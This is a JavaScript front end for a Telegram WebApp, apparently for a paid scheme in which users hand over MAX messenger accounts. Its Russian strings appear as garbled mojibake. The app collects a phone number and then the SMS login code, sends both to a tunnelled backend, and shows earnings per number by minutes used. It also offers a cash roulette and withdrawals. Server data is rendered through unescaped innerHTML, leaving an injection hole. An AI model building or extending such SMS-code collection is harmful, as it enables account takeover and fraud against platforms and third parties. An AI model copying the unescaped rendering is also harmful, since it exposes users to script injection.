// script.js ‚Äî Telegram WebApp —Ñ—Ä–æ–Ω—Ç –¥–ª—è Blessed MAX
// –ü–æ–¥ —Ç–≤–æ–π —Å–µ—Ä–≤–µ—Ä: POST JSON –Ω–∞ /api/*, CORS –≤–∫–ª—é—á—ë–Ω –Ω–∞ –±—ç–∫–µ
;(function(){
  'use strict';

  // === –ö–æ–Ω—Ñ–∏–≥ ===
  const API_BASE = 'https://earning-attitude-hunt-wrote.trycloudflare.com'.replace(/\/$/,'');
  const tg = window.Telegram?.WebApp;
  if (tg) tg.expand();

  // initData –∏–∑ Telegram –∏–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã dev-—Ä–µ–∂–∏–º–∞
  const qp = new URLSearchParams(location.search);
  const initData = tg?.initData || qp.get('initData') || '';
  const userUnsafe = tg?.initDataUnsafe?.user || {};
  const USER_ID = userUnsafe.id || Number(qp.get('user_id')) || 1;
  const USERNAME = userUnsafe.username || userUnsafe.first_name || qp.get('username') || 'user';

  // === –£—Ç–∏–ª–∏—Ç—ã DOM ===
  const $  = (s, r=document) => r.querySelector(s);
  const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
  const byId = (id) => document.getElementById(id);

  // –ù–æ—Ç–∏—Ñ–∞–π
  const notifyRoot = byId('notify-root');
  function toast(type, title, msg, ms=3000){
    if(!notifyRoot) return;
    const el = document.createElement('div');
    el.className = `notif ${type||'info'}`;
    el.innerHTML = `<div><div class="title">${title||'–°–æ–æ–±—â–µ–Ω–∏–µ'}</div><div class="msg">${msg||''}</div></div><button class="x" aria-label="–ó–∞–∫—Ä—ã—Ç—å">‚úï</button>`;
    notifyRoot.appendChild(el);
    const hide = ()=>{ el.remove(); };
    el.querySelector('.x').onclick = hide;
    setTimeout(hide, ms);
  }
  function modal(title, content){
    const dlg = byId('notify-modal'); if(!dlg) return;
    byId('notify-title').textContent = title||'';
    byId('notify-content').textContent = content||'';
    dlg.classList.remove('hidden');
    byId('notify-close').onclick = ()=> dlg.classList.add('hidden');
  }

  // –†–∏–ø–ø–ª –ø–æ–¥—Å–≤–µ—Ç–∫–∞ –Ω–∞ –∫–Ω–æ–ø–∫–∞—Ö
  document.addEventListener('pointermove',(e)=>{
    const b = e.target?.closest('button'); if(!b) return;
    const r = b.getBoundingClientRect();
    b.style.setProperty('--rx', (e.clientX-r.left)+'px');
    b.style.setProperty('--ry', (e.clientY-r.top)+'px');
  });

  // === HTTP ===
  async function post(path, data={}){
    const url = API_BASE + (path.startsWith('/')?path:'/'+path);
    const body = initData ? { ...data, initData } : { ...data, user_id: USER_ID, username: USERNAME };
    const res = await fetch(url, {
      method: 'POST',
      mode: 'cors',
      headers: { 'Content-Type':'application/json' },
      body: JSON.stringify(body),
      credentials: 'omit',
    });
    let j=null;
    try{ j = await res.json(); }catch(e){}
    if(!res.ok || !j || j.ok === false){
      const err = (j && (j.error||j.message)) || `HTTP ${res.status}`;
      throw new Error(err);
    }
    return j;
  }

  // –ë—ã—Å—Ç—Ä—ã–π —á–µ–∫ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ API
  async function checkApi(){
    try{
      const r = await post('/api/bootstrap', {}); // —Å–µ—Ä–≤–µ—Ä –∑–∞–ø–æ–ª–Ω–∏—Ç stats –∏ username
      console.info('[API] OK', r);
      return true;
    }catch(e){
      console.error('[API] FAIL', e);
      toast('error','API –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ','–ü—Ä–æ–≤–µ—Ä—å API_BASE –∏ —Ç—É–Ω–Ω–µ–ª—å', 4000);
      return false;
    }
  }

  // === –ù–∞–≤–∏–≥–∞—Ü–∏—è ===
  const SCREENS = {
    menu: byId('menu'),
    stats: byId('screen-stats'),
    submit: byId('screen-submit'),
    report: byId('screen-report'),
    priv: byId('screen-priv'),
    roulette: byId('screen-roulette'),
    withdraw: byId('screen-withdraw'),
    contests: byId('screen-contests'),
  };
  function show(id){
    Object.values(SCREENS).forEach(el=> el && el.classList.add('hidden'));
    (SCREENS[id]||SCREENS.menu)?.classList.remove('hidden');
  }
  $$('#menu [data-screen]').forEach(b=> b.addEventListener('click', ()=>{
    const s = b.getAttribute('data-screen');
    show(s);
    if(s==='stats') loadStats();
    if(s==='report') loadReport();
    if(s==='priv')   loadPriv();
    if(s==='roulette') setupRouletteOnce();
    if(s==='contests') loadContests();
    if(s==='withdraw') refreshBalance();
  }));
  $$('.back').forEach(b=> b.addEventListener('click', ()=> show('menu')));

  // === –ß–∞—Ç-–ª–æ–≥ ===
  const chatBox = byId('chat');
  function pushBubble(role, text, ts){
    if(!chatBox) return;
    const el = document.createElement('div');
    el.className = `bubble ${role==='admin'?'b-admin': role==='user'?'b-user':'b-system'}`;
    el.innerHTML = `${text}<div class="meta">${ts||''}</div>`;
    chatBox.appendChild(el);
    chatBox.scrollTop = chatBox.scrollHeight;
  }
  async function loadLogs(){
    try{
      const r = await post('/api/logs', {});
      if(chatBox) chatBox.innerHTML = '';
      (r.events||[]).forEach(e=> pushBubble(e.role, e.text, e.ts));
    }catch(e){
      console.warn('logs', e);
    }
  }
  byId('refreshLogs')?.addEventListener('click', loadLogs);

  // === –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ ===
  async function loadStats(){
    const pre = byId('statsBox');
    try{
      const r = await post('/api/stats', {});
      pre && (pre.textContent = JSON.stringify(r.stats||{}, null, 2));
    }catch(e){
      pre && (pre.textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏');
    }
  }

  // === –°–¥–∞—á–∞ MAX (—Ç–µ–ª–µ—Ñ–æ–Ω + –∫–æ–¥) ===
  let currentSubmissionId = 0;
  const phoneInput = byId('phone');
  const codePanel  = byId('codePanel');
  const codeInput  = byId('code');

  byId('sendPhone')?.addEventListener('click', async ()=>{
    const phone = (phoneInput?.value||'').trim();
    if(!phone){ return toast('error','–ù–æ–º–µ—Ä','–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞'); }
    try{
      const r = await post('/api/submit_phone', { phone });
      currentSubmissionId = r.submission_id||0;
      codePanel?.classList.remove('hidden');
      toast('success','–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ','–ñ–¥—ë–º –∫–æ–¥ –∏–∑ SMS');
      loadLogs();
    }catch(e){
      toast('error','–û—à–∏–±–∫–∞', String(e.message||e));
    }
  });

  byId('sendCode')?.addEventListener('click', async ()=>{
    const code = (codeInput?.value||'').trim();
    if(!currentSubmissionId || !code){ return toast('error','–ö–æ–¥','–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS'); }
    try{
      await post('/api/submit_code', { submission_id: currentSubmissionId, code });
      toast('success','–ö–æ–¥ –ø—Ä–∏–Ω—è—Ç','–û–∂–∏–¥–∞–π—Ç–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
      loadLogs();
    }catch(e){
      toast('error','–û—à–∏–±–∫–∞', String(e.message||e));
    }
  });

  // === –ú–æ–∏ –Ω–æ–º–µ—Ä–∞ (–æ—Ç—á—ë—Ç) ===
  async function loadReport(){
    const box = byId('reportList');
    if(!box) return;
    box.innerHTML = '';
    try{
      const r = await post('/api/my_numbers', {});
      (r.rows||[]).forEach(row=>{
        const div = document.createElement('div');
        div.className = 'contest-card';
        div.innerHTML = `
          <div class="contest-title">#${row.id} ‚Ä¢ ${row.phone||'‚Äî'}</div>
          <div class="contest-meta">
            <span>–°—Ç–∞—Ç—É—Å: <b>${row.status}</b></span>
            <span>–ú–∏–Ω—É—Ç: <b>${row.minutes}</b></span>
            <span>–ù–∞—á–∏—Å–ª–µ–Ω–æ: <b>$${Number(row.earned||0).toFixed(2)}</b></span>
          </div>`;
        box.appendChild(div);
      });
    }catch(e){
      box.textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –æ—Ç—á—ë—Ç–∞';
    }
  }
  byId('reportRefresh')?.addEventListener('click', loadReport);

  // === –ü—Ä–∏–≤–∏–ª–µ–≥–∏–∏ ===
  async function loadPriv(){
    const sum = byId('privSummary');
    try{
      const r = await post('/api/priv/info', {});
      const plan = r.plan?.plan||'standard';
      const until = r.plan?.plan_until||'‚Äî';
      const rate = r.rate!=null? `$${Number(r.rate).toFixed(2)}` : '‚Äî';
      sum && (sum.textContent = `–¢–∞—Ä–∏—Ñ: ${plan} ‚Ä¢ –°—Ç–∞–≤–∫–∞: ${rate} ‚Ä¢ –î–µ–π—Å—Ç–≤—É–µ—Ç –¥–æ: ${until}`);
      const prices = r.prices||{};
      byId('price-premium') && (byId('price-premium').textContent = `$${prices.premium||40}`);
      byId('price-speed')   && (byId('price-speed').textContent   = `$${prices.speed||30}`);
    }catch(e){
      sum && (sum.textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ç–∞—Ä–∏—Ñ–æ–≤');
    }
  }
  byId('buy-premium')?.addEventListener('click', async ()=>{
    try{
      const r = await post('/api/priv/buy', { plan:'premium' });
      toast('success','–¢–∞—Ä–∏—Ñ','–ü—Ä–µ–º–∏—É–º –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω');
      loadPriv();
    }catch(e){ toast('error','–ü–æ–∫—É–ø–∫–∞', String(e.message||e)); }
  });
  byId('buy-speed')?.addEventListener('click', async ()=>{
    try{
      const r = await post('/api/priv/buy', { plan:'speed' });
      toast('success','–¢–∞—Ä–∏—Ñ','Speed –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω');
      loadPriv();
    }catch(e){ toast('error','–ü–æ–∫—É–ø–∫–∞', String(e.message||e)); }
  });
  byId('std-activate')?.addEventListener('click', async ()=>{
    try{
      const r = await post('/api/priv/activate_standard', {});
      toast('success','–°—Ç–∞–Ω–¥–∞—Ä—Ç','–í–æ–∑–≤—Ä–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω');
      loadPriv();
    }catch(e){ toast('error','–°—Ç–∞–Ω–¥–∞—Ä—Ç', String(e.message||e)); }
  });

  // === –†—É–ª–µ—Ç–∫–∞ ===
  const strip = byId('case-strip');
  let rouletteReady = false;
  function setupRouletteOnce(){
    if(rouletteReady || !strip) return;
    rouletteReady = true;
    const items = [
      {t:'$0.10',i:'üí†'},{t:'$0.20',i:'ü™ô'},{t:'$0.50',i:'üíé'},{t:'$0.00',i:'‚ùå'},
      {t:'$0.30',i:'üîπ'},{t:'$0.70',i:'üî∑'},{t:'$1.20',i:'‚≠ê'},{t:'$0.95',i:'‚ú®'}
    ];
    for(let k=0;k<18;k++){
      const it = items[k%items.length];
      const tile = document.createElement('div');
      tile.className = 'case-tile';
      tile.innerHTML = `<div class="icon">${it.i}</div>${it.t}`;
      strip.appendChild(tile);
    }
  }
  async function spin(){
    try{
      const r = await post('/api/roulette_spin', {});
      const win = Number(r.win||0);
      byId('ru-result') && (byId('ru-result').textContent = `–í—ã–∏–≥—Ä—ã—à: $${win.toFixed(2)} ‚Ä¢ –ë–∞–ª–∞–Ω—Å: $${Number(r.balance||0).toFixed(2)}`);
      // –ø—Ä–æ—Å—Ç–∞—è –∞–Ω–∏–º–∞—Ü–∏—è: –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ –Ω–∞ —Å–ª—É—á–∞–π–Ω—É—é –ø–æ–∑–∏—Ü–∏—é
      const w = strip.scrollWidth; strip.style.transform = 'translateX(0)';
      const shift = -Math.floor(Math.random()*(w-300));
      strip.animate([{transform:'translateX(0px)'},{transform:`translateX(${shift}px)`}], {duration:900, easing:'cubic-bezier(.2,.8,.2,1)', fill:'forwards'});
      loadLogs();
    }catch(e){
      toast('error','–†—É–ª–µ—Ç–∫–∞', String(e.message||e));
    }
  }
  byId('ru-spin')?.addEventListener('click', spin);

  // === –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ ===
  async function refreshBalance(){
    try{
      const r = await post('/api/stats', {});
      const bal = Number(r.stats?.balance||0);
      byId('wdBalance') && (byId('wdBalance').textContent = bal.toFixed(2));
    }catch(e){}
  }
  byId('wdSend')?.addEventListener('click', async ()=>{
    const amt = Number(byId('wdAmount')?.value||0);
    if(!(amt>=5 && amt<=100)) return toast('error','–°—É–º–º–∞','–î–æ–ø—É—Å—Ç–∏–º–æ 5‚Äì100$');
    try{
      const r = await post('/api/withdraw_request', { amount: amt });
      toast('success','–ó–∞—è–≤–∫–∞ —Å–æ–∑–¥–∞–Ω–∞', `ID ${r.payout_id}`);
      refreshBalance(); loadLogs();
    }catch(e){ toast('error','–í—ã–≤–æ–¥', String(e.message||e)); }
  });
  byId('wdCancel')?.addEventListener('click', async ()=>{
    try{
      const r = await post('/api/withdraw_cancel', {});
      toast(r.ok?'success':'error', r.ok?'–û—Ç–º–µ–Ω–µ–Ω–æ':'–û—à–∏–±–∫–∞', r.ok?'–ó–∞—è–≤–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞':'–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –∑–∞—è–≤–∫–∏');
      refreshBalance(); loadLogs();
    }catch(e){ toast('error','–û—Ç–º–µ–Ω–∞', String(e.message||e)); }
  });

  // === –ö–æ–Ω–∫—É—Ä—Å—ã ===
  async function loadContests(){
    const list = byId('contestList'); if(!list) return;
    list.innerHTML = '';
    try{
      const r = await post('/api/contests', {});
      (r.items||[]).forEach(c=>{
        const card = document.createElement('div');
        card.className = 'contest-card';
        card.innerHTML = `
          <div class="contest-title">${c.title}</div>
          <div class="contest-meta">
            <span>–ü—Ä–∏–∑: <b>${c.prize}</b></span>
            <span>–ü–æ–±–µ–¥–∏—Ç–µ–ª–µ–π: <b>${c.winners}</b></span>
            <span>–î–æ: <b>${c.until||'‚Äî'}</b></span>
            <span>–£—á–∞—Å—Ç–Ω–∏–∫–æ–≤: <b>${c.entries}</b></span>
          </div>
          <div class="contest-actions">
            <button class="secondary" data-join="${c.id}">–£—á–∞—Å—Ç–≤–æ–≤–∞—Ç—å</button>
          </div>`;
        list.appendChild(card);
      });
    }catch(e){
      list.textContent = '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω–∫—É—Ä—Å–æ–≤';
    }
  }
  byId('contestList')?.addEventListener('click', async (e)=>{
    const btn = e.target.closest('[data-join]'); if(!btn) return;
    const cid = Number(btn.getAttribute('data-join'));
    try{
      await post('/api/contest_join', { contest_id: cid });
      toast('success','–ö–æ–Ω–∫—É—Ä—Å','–ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
      loadContests();
    }catch(err){ toast('error','–ö–æ–Ω–∫—É—Ä—Å', String(err.message||err)); }
  });

  // === –°—Ç–∞—Ä—Ç ===
  (async function init(){
    show('menu');
    await checkApi();
    await loadStats();
    await loadLogs();
  })();
})();
